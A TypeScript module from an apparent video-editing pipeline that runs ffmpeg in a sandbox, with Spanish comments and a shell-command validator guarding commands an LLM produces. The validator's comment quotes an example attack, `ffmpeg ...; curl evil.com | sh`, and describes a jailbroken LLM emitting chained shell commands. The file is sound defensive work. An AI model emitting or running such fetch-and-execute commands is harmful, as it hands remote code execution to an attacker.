import { Sandbox } from "@vercel/sandbox";
import { SilenceSegment, ClienteProfile } from "@/types";
import { runInSandbox } from "./sandbox";
import type { VideoMetadata } from "./premiere-xml";

export async function detectarSilencios(
  sandbox: Sandbox,
  videoPath: string,
  config: ClienteProfile["silencio"]
): Promise<SilenceSegment[]> {
  const cmd = `ffmpeg -hide_banner -i "${videoPath}" -af "silencedetect=noise=${config.umbral_db}dB:d=${config.duracion_minima_seg}" -f null - 2>&1`;
  const { stdout } = await runInSandbox(sandbox, cmd);

  const startMatches = [...stdout.matchAll(/silence_start:\s*([\d.]+)/g)];
  const endMatches = [...stdout.matchAll(/silence_end:\s*([\d.]+)/g)];

  const silencios: SilenceSegment[] = [];
  for (let i = 0; i < startMatches.length; i++) {
    const start = parseFloat(startMatches[i][1]);
    const endMatch = endMatches[i];
    if (!endMatch) continue;
    const end = parseFloat(endMatch[1]);
    silencios.push({
      start: Math.max(0, start + config.margen_seg),
      end: Math.max(0, end - config.margen_seg),
      duracion: end - start,
    });
  }

  return silencios.filter((s) => s.end > s.start);
}

/**
 * Valida que un comando shell sea "seguro" para ejecutar en el sandbox.
 *
 * Antes ejecutábamos cualquier string que Claude (o cualquier otro caller)
 * pusiera en `ffmpegCommands` sin filtrar — un LLM jailbreakeado podía emitir
 * `ffmpeg ...; curl evil.com | sh` y se ejecutaba como shell command.
 *
 * Reglas:
 *  - Debe empezar con `ffmpeg` o `printf "%s\\n"` (este último se usa en
 *    multiclip-utils para generar el concat list — caso conocido y acotado).
 *  - No puede contener metacaracteres de shell que rompan el "un solo
 *    comando": `;`, `&&`, `||`, `|`, `$(`, backticks, `>`, `<`, `&`, newlines.
 *    El único redirect que permitimos es el `>` literal de printf > file,
 *    que validamos por la forma del prefijo printf.
 *  - Longitud razonable (< 20 KB) para evitar abuse.
 *
 * Lanza con mensaje claro si algo no cuadra. No intenta "sanitizar" — el
 * pipeline debería fallar rápido si la IA devuelve algo raro.
 */
export function validateShellCommand(cmd: string): void {
  if (typeof cmd !== "string" || cmd.length === 0) {
    throw new Error("Comando vacío o no-string");
  }
  if (cmd.length > 20_000) {
    throw new Error(`Comando demasiado largo (${cmd.length} chars)`);
  }
  if (/[\r\n]/.test(cmd)) {
    throw new Error("Comando contiene saltos de línea");
  }
  const trimmed = cmd.trimStart();
  const isFFmpeg = /^ffmpeg(\s|$)/.test(trimmed);
  // Caso especial: el builder multiclip emite un `printf "%s\n" ... > file`
  // para construir la lista de concat. Es legítimo y acotado.
  const isPrintfConcat =
    /^printf\s+"%s\\n"\s+("[^"]*"\s+)+>\s+"[^"]+"\s*$/.test(trimmed);
  if (!isFFmpeg && !isPrintfConcat) {
    throw new Error(
      `Comando rechazado: debe empezar con "ffmpeg" o ser printf-concat. ` +
        `Recibido: ${trimmed.slice(0, 80)}`
    );
  }
  if (isFFmpeg) {
    // Para comandos ffmpeg, prohibimos cualquier metacaracter de shell que
    // permita encadenar otro comando. Si una URL o filename necesita esos
    // caracteres, el comando debió construirse con shSingleQuote (las
    // metacaracteres dentro de single quotes son literales y NO matchean
    // este regex porque verificamos el comando completo, no el contenido
    // entre quotes).
    //
    // Por simplicidad usamos un patrón conservador: rechazamos backticks,
    // `$(`, `;`, `&&`, `||`, `|` no entrecomillados. Es overly restrictive
    // para casos legítimos (ffmpeg con pipe a otro proceso), pero nuestro
    // pipeline nunca los necesita.
    const dangerous = /[;`]|\$\(|&&|\|\||(?:^|[^|])\|(?:[^|]|$)/;
    // Tokenizamos quitando contenido entre comillas para chequear el shell.
    const naked = cmd
      .replace(/"(?:[^"\\]|\\.)*"/g, '""')
      .replace(/'(?:[^'\\]|\\.)*'/g, "''");
    if (dangerous.test(naked)) {
      throw new Error(
        `Comando ffmpeg contiene metacaracteres de shell prohibidos: ` +
          naked.slice(0, 120)
      );
    }
  }
}

export async function ejecutarFFmpegCommands(
  sandbox: Sandbox,
  commands: string[]
): Promise<void> {
  for (const cmd of commands) {
    validateShellCommand(cmd);
    const { stderr, exitCode } = await runInSandbox(sandbox, cmd);
    if (exitCode !== 0) {
      throw new Error(`FFmpeg falló (exit ${exitCode}): ${stderr.slice(-500)}`);
    }
  }
}

/**
 * Extract width, height, fps and duration via `ffmpeg -i`. Sin output ffmpeg
 * imprime la info por stderr (que `2>&1` redirige a stdout) y sale con 1, así
 * que mandamos `|| true` para no propagar el exit code.
 */
export async function extraerMetadata(
  sandbox: Sandbox,
  videoPath: string
): Promise<VideoMetadata> {
  const { stdout } = await runInSandbox(
    sandbox,
    `ffmpeg -hide_banner -i "${videoPath}" 2>&1 || true`
  );

  const sizeMatch = stdout.match(/(\d{2,5})x(\d{2,5})/);
  const fpsMatch = stdout.match(/(\d+(?:\.\d+)?)\s*(?:fps|tbr)/);
  const durationMatch = stdout.match(
    /Duration:\s*(\d+):(\d+):(\d+(?:\.\d+)?)/
  );

  const width = sizeMatch ? parseInt(sizeMatch[1], 10) : 1920;
  const height = sizeMatch ? parseInt(sizeMatch[2], 10) : 1080;
  const fps = fpsMatch ? Math.round(parseFloat(fpsMatch[1])) : 30;

  let duracion = 0;
  if (durationMatch) {
    duracion =
      parseInt(durationMatch[1], 10) * 3600 +
      parseInt(durationMatch[2], 10) * 60 +
      parseFloat(durationMatch[3]);
  }

  if (duracion === 0) {
    throw new Error("No se pudo extraer la duración del video");
  }

  return { width, height, fps: fps > 0 ? fps : 30, duracion };
}
